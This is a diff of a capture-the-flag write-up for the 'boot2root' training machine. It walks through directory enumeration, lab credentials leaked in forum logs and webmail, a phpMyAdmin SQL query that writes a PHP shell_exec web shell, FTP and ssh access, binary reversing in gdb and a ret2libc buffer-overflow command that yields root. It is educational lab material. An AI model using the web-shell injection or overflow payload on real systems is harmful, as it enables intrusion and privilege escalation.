@@ -40,55 +40,102 @@ PORT    STATE SERVICE
 * The machine with the most ports open is the one we are looking for...
 * In this example : 192.168.80.128
 
-* Now we need to get access to the file system of the ISO.
-* Among other files, this ISO contains the following one : "filesystem.squashfs".
-* This is actually the whole compressed file system.
-* To decompress and extract it we can use "squashfs".
+## Secondly we are looking for credentials.
 
-```unsquashfs -f -d /path/to/destination/ /path/to/source/filesystem.squashfs```
-
-* Directory : /home/lmezard/
--------------------------------------------------------------------------------
-
-* In /home/lmezard/ we find 2 files.
+* We use a software call Drib to scrap some of the most common url of the website.
 
 ```
-cd /home/lmezard/ ; ls
-fun  README
+git clone https://github.com/v0re/dirb.git
+./dirb https://[YOUR IP]/ wordlists/common.txt
+
+---- Scanning URL: https://10.12.1.150/ ----
++ https://10.12.1.150/cgi-bin/ (CODE:403|SIZE:288)
+==> DIRECTORY: https://10.12.1.150/forum/
+==> DIRECTORY: https://10.12.1.150/phpmyadmin/
++ https://10.12.1.150/server-status (CODE:403|SIZE:293)
+==> DIRECTORY: https://10.12.1.150/webmail/
 ```
-* The fun file is actually an archive...
+### Forum
 
+* After sneaking around and read all the forum post, we find a clue on the post "Probleme login ?" url = https://10.12.1.150/forum/index.php?id=6
+
+* If your look for ```Failed password``` your will find one where the user is ``` !q\]Ej?*5K5cy*AJ``` and we think that the user who tried to login make a mistake between are password and login
+
+![alt text](https://github.com/fhenri42/boot2root/blob/master/Ressources/Screen%20Shot%202018-03-05%20at%2010.05.14%20AM.png)
+
+* We can see couple second after this attempt, lmezard successful login, so we can conclude the login is lmezard (Laurie Mezard)
+
+* Use this credential to login the forum.
+
+* Conclution we have one of the password and the email of lmezard.
+
+### Webmail
+
+* On the webmail we have a login form, and we just find a password and a email in the forum section so we decided to give it a try.
+
+![alt text](https://github.com/fhenri42/boot2root/blob/master/Ressources/Screen%20Shot%202018-03-05%20at%2010.04.21%20AM.png)
+
+* Login: ```laurie@borntosec.net```
+* Password: ```!q\]Ej?*5K5cy*AJ```
+
+* When we logged in , we find a email with the subject ```DB Access```
+
+
+![alt text](https://github.com/fhenri42/boot2root/blob/master/Ressources/Screen%20Shot%202018-03-05%20at%2010.06.32%20AM.png)
+
+* Login: ```root```
+* Password: ```Fg-'kKXBj87E:aJ$```
+* we really suspect in the access for a DB
+
+### Phpmyadmin
+
+* We tried the credentials of the email to login phpmyadmin and it worcks :)
+* After some research on the web we stumble on this [aritcle](http://www.informit.com/articles/article.aspx?p=1407358&seqNum=2)
+* The injection sql we are looking for is:
+```select "<?php $output = shell_exec('cat /home/LOOKATME/password'); echo $output  ?>" into outfile "/var/www/forum/templates_c/endTest0.php"```
+* Copy past this line and go to to => https://10.12.1.150/phpmyadmin/index.php on the sql tab
+* After this step your just need to go to https://10.12.1.150/forum/templates_c/endTest0.php
+* You will find ```lmezard:G!@M6f4Eatau{sF"```
+* Login: ```lmezard```
+* Password: ```G!@M6f4Eatau{sF"```
+
+## Use the credentials
+
+* Now we got the password of the server, we can try to log on the FTP service
+* ftp [YOUR-IP-ADDRESS]
+* login with  ```lmezard``` ```G!@M6f4Eatau{sF"```
+* get the fun file, see example bellow:
+
+```bash
+ftp> ls
+229 Entering Extended Passive Mode (|||25027|).
+150 Here comes the directory listing.
+-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
+-rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
+226 Directory send OK.
+ftp> get fun
+local: fun remote: fun
+229 Entering Extended Passive Mode (|||7488|).
+150 Opening BINARY mode data connection for fun (808960 bytes).
+100% |****************************************************************************************************************************************|   790 KiB  127.07 MiB/s    00:00 ETA
+226 Transfer complete.
+808960 bytes received in 00:00 (120.03 MiB/s)
+ftp> ls
+229 Entering Extended Passive Mode (|||44244|).
+150 Here comes the directory listing.
+-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
+-rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
+226 Directory send OK.
+ftp>
 ```
-file fun
-fun: POSIX tar archive (GNU)
-```
 
-* Decompressing it produces a new directory called "ft_fun".
+## Using the fun file
 
-```
-tar xvf fun ; ls
-ft_fun  fun  README
-```
+* Refer to writeup1, step 2
+* ssh login: laurie / 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
 
-* "ft_fun" directory contains a fuck tone of files...
-* We notice that each one of them is written in C language and its last line is tagged with a comment like so
-//file3
-//file235
-...
-
-* We can then make a little PHP script to read them and recompose the original C file, compile the file and execute it.
-
-```
-php pack.php && gcc main.c && ./a.out
-MY PASSWORD IS: Iheartpwnage
-Now SHA-256 it and submit
-```
-
-* If we sha256 this password we obtain :
-
-```330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4```
-
-* We can now connect with ssh as "laurie".
+## ssh connection
+* use  ``ssh laurie@10.12.1.150`` add use the password when it's ask
 
 * Directory : /home/laurie/
 -------------------------------------------------------------------------------
@@ -101,7 +148,7 @@ pwd ; ls
 README  bomb
 ```
 * To crack the bomb binary we will use gdb as fuck...
-* For each step we will use the following command : 
+* For each step we will use the following command :
 
 ``` (gdb) disas phase_N```
 
@@ -141,7 +188,7 @@ Obvious ...
 * At 0x08048d7b we find this string "isrveawhobpnutfg".
 * If we compare it to the alphabet we can see the following pattern.
 
-``` 
+```
 abcdefghijklmno
 pqrstuvwxyz
 ```
@@ -203,8 +250,9 @@ Segmentation fault (core dumped)
 
 * Using python, that gives us :
 
-$ ./exploit_me $(python -c "print('A' * 140 + '\xb7\xe6\xb0\x60'[::-1] + 'AAAA' + '\xb7\xf8\xcc\x58'[::-1])")
-# id
+```
+./exploit_me $(python -c "print('A' * 140 + '\xb7\xe6\xb0\x60'[::-1] + 'AAAA' + '\xb7\xf8\xcc\x58'[::-1])")
+id
 uid=1005(zaz) gid=1005(zaz) euid=0(root) groups=0(root),1005(zaz)
-
+```
 # TADAM WE ARE ROOT !
